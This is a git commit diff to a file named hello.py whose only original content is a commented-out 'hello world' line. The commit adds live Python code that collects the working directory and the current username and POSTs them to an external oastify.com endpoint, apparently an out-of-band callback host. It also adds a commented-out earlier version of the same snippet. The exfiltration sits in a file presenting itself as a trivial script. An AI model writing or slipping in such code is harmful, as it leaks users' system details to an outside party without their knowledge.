a59207b64f5e0409f36e0fe6b0c3a0f2525e7f68
MaorCY <124798781+MaorCY@users.noreply.github.com>
2024-07-24 16:43:06 +0300

    Update hello.py

--- hello.py
+++ hello.py
@@ -5,12 +5,40 @@
 # print("hello world")
 
 
+# import os
+# import urllib.parse
+# import urllib.request
+
+# # Get the current working directory
+# current_directory = os.getcwd()
+
+# # Define the URL to send the data
+# url = 'https://ymok1fqw4l081pc7zy0k61uwmnsega4z.oastify.com'
+
+# # Create a dictionary with the data to send
+# data = {
+#     'directory': current_directory,
+#     'user': os.environ['USERNAME']
+# }
+
+# # Encode the data for the URL
+# encoded_data = urllib.parse.urlencode(data).encode('utf-8')
+
+# # Send the data to the URL
+# with urllib.request.urlopen(url, data=encoded_data) as response:
+#     print(f'Data sent successfully to {url}')
+
 import os
+import pwd
 import urllib.parse
 import urllib.request
 
 # Get the current working directory
 current_directory = os.getcwd()
+
+# Get the current user
+user_info = pwd.getpwuid(os.getuid())
+current_user = user_info.pw_name
 
 # Define the URL to send the data
 url = 'https://ymok1fqw4l081pc7zy0k61uwmnsega4z.oastify.com'
@@ -18,7 +46,7 @@ url = 'https://ymok1fqw4l081pc7zy0k61uwmnsega4z.oastify.com'
 # Create a dictionary with the data to send
 data = {
     'directory': current_directory,
-    'user': os.environ['USERNAME']
+    'user': current_user
 }
 
 # Encode the data for the URL
@@ -27,4 +55,3 @@ encoded_data = urllib.parse.urlencode(data).encode('utf-8')
 # Send the data to the URL
 with urllib.request.urlopen(url, data=encoded_data) as response:
     print(f'Data sent successfully to {url}')
-
